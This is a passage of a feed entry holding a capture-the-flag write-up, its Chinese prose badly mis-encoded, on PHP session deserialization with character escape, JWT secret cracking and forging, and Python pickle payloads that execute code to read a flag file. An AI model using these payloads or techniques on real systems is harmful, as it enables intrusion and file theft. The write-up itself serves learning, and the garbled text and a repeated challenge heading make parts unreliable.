class=&#34;hljs-variable&#34;&gt;$_POST&lt;/span&gt;);&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(!&lt;span class=&#34;hljs-variable&#34;&gt;$function&lt;/span&gt;)&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;lt;a href=&amp;quot;index.php?f=highlight_file&amp;quot;&amp;gt;source_code&amp;lt;/a&amp;gt;&amp;#x27;&lt;/span&gt;;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(!&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;img_path&amp;#x27;&lt;/span&gt;])&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$_SESSION&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;img&amp;#x27;&lt;/span&gt;] = base64_encode(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;guest_img.png&amp;#x27;&lt;/span&gt;);&lt;br&gt;&amp;#125;&lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$_SESSION&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;img&amp;#x27;&lt;/span&gt;] = sha1(base64_encode(&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;img_path&amp;#x27;&lt;/span&gt;]));&lt;br&gt;&amp;#125;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$serialize_info&lt;/span&gt; = filter(serialize(&lt;span class=&#34;hljs-variable&#34;&gt;$_SESSION&lt;/span&gt;));&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$function&lt;/span&gt; == &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;highlight_file&amp;#x27;&lt;/span&gt;)&amp;#123;&lt;br&gt;    highlight_file(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;index.php&amp;#x27;&lt;/span&gt;);&lt;br&gt;&amp;#125;&lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$function&lt;/span&gt; == &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;phpinfo&amp;#x27;&lt;/span&gt;)&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;phpinfo();&amp;#x27;&lt;/span&gt;); &lt;span class=&#34;hljs-comment&#34;&gt;//maybe you can find something in here!&lt;/span&gt;&lt;br&gt;&amp;#125;&lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$function&lt;/span&gt; == &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;show_image&amp;#x27;&lt;/span&gt;)&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$userinfo&lt;/span&gt; = unserialize(&lt;span class=&#34;hljs-variable&#34;&gt;$serialize_info&lt;/span&gt;);&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; file_get_contents(base64_decode(&lt;span class=&#34;hljs-variable&#34;&gt;$userinfo&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;img&amp;#x27;&lt;/span&gt;]));&lt;br&gt;&amp;#125; &lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ç»™å‡ºäº† phpinfo å¹¶ä¸”æç¤ºé‡Œé¢æœ‰å†…å®¹ï¼Œçœ‹åˆ° &lt;code&gt;d0g3_f1ag.php&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;çœ‹åˆ°ååºåˆ—åŒ– sessionï¼Œç›²çŒœåº”è¯¥æ˜¯ session.upload_progress çš„é¢˜ç›®ï¼Œç„¶å filter å‡½æ•°åº”è¯¥æ˜¯æ˜¯åˆ©ç”¨å­—ç¬¦é€ƒé€¸&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æœ‰ä¸€ä¸ª &lt;code&gt;extract($_POST);&lt;/code&gt; ï¼Œå½“æˆ‘ä»¬ POST ä¸€ä¸ª_SESSION å˜é‡ä¹‹åï¼Œå°±ä¼šè¦†ç›– SESSIONï¼Œè¿™é‡Œå°±æ˜¯å¯æ§ç‚¹&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æ¥ä¸‹æ¥å°±æ˜¯å¦‚ä½•å­—ç¬¦é€ƒé€¸ã€‚æˆ‘ä»¬éœ€è¦æ„é€ å‡ºæ¥çš„ session æ˜¯&lt;/p&gt;
&lt;figure class=&#34;highlight apache&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;_SESSION&lt;/span&gt;[user]=&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;flagphpphpflagphp&lt;/span&gt;&amp;amp;_SESSION[exp]=;s:&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;img&amp;quot;&lt;/span&gt;;s:&lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;ZDBnM19mMWFnLnBocA==&amp;quot;&lt;/span&gt;;s:&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;exp&amp;quot;&lt;/span&gt;;s:&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;a&amp;quot;&lt;/span&gt;&amp;amp;_SESSION[function]=flagflagflagflagflagflagflagflagphpphp&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æ‹¿åˆ° d0g3_f1ag.php æºç ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$flag&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;flag in /d0g3_fllllllag&amp;#x27;&lt;/span&gt;;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;å‘ç°æ–‡ä»¶åç»è¿‡ base64 ç¼–ç åé•¿åº¦ä¸å˜ï¼Œæ”¹ä¸€ä¸‹å°±å¥½ï¼Œæ‹¿åˆ° flag&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;å®‰æ´µæ¯-2019easy_serialize_php-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#å®‰æ´µæ¯-2019easy_serialize_php-2&#34;&gt;#&lt;/a&gt; [å®‰æ´µæ¯ 2019] easy_serialize_php&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;æç¤ºæ‰¾åˆ° &amp;quot;lv6&amp;quot;ï¼Œç”¨è„šæœ¬è·‘ï¼Œåœ¨ç¬¬ 181 é¡µ&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ä¹°ä¸èµ·ï¼Œæ”¹æŠ˜æ‰£ï¼Œæç¤º &lt;code&gt;b1g_m4mber&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æç¤ºåªèƒ½ admin è®¿é—®ï¼Œæœ‰ JWT&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/brendan-rius/c-jwt-cracker&#34;&gt;https://github.com/brendan-rius/c-jwt-cracker&lt;/a&gt;  ç”¨è¿™ä¸ªå·¥å…·è·‘   å¯†é’¥æ˜¯ &lt;code&gt;1Kun&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ç”¨ https://jwt.io/#encoded-jwt ä¿®æ”¹ï¼Œæ‹¿åˆ°ä¿®æ”¹åçš„ JWTï¼Œè®¿é—®æ‹¿åˆ°æç¤º &lt;code&gt;/static/asd1f654e683wq/www.zip&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æºç ä¸­ Admin.py æœ‰ä¸€ä¸ª pickle è§¦å‘ç‚¹&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;payloadï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; marshal&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; base64&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; urllib&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;foo&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; commands&lt;br&gt;    output = commands.getstatusoutput(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;cat /flag.txt&amp;#x27;&lt;/span&gt;)&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; output&lt;br&gt;&lt;br&gt;payload = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;ctypes&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;FunctionType&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;(cmarshal&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;loads&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;(cbase64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;b64decode&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;(S&amp;#x27;%s&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;tRtRc__builtin__&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;globals&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;(tRS&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;tR(tR.&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt; % base64.b64encode(marshal.dumps(foo.func_code))&lt;br&gt;&lt;br&gt;&lt;br&gt;payload = urllib.quote(payload)&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt; payload&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;ç½‘ä¸Šç‰ˆæœ¬&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; pickle&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; urllib&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;A&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;object&lt;/span&gt;&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;__reduce__&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;self&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;        a = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;open(&amp;#x27;/flag.txt&amp;#x27;,&amp;#x27;r&amp;#x27;).read()&amp;quot;&lt;/span&gt;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; (&lt;span class=&#34;hljs-built_in&#34;&gt;eval&lt;/span&gt;,(a,))&lt;br&gt;a = A()&lt;br&gt;test = pickle.dumps(a)&lt;br&gt;payload = urllib.quote(test)&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt; payload&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ol&gt;
</content>
        <updated>2019-11-20T14:49:13.000Z</updated>
    </entry>
</feed>
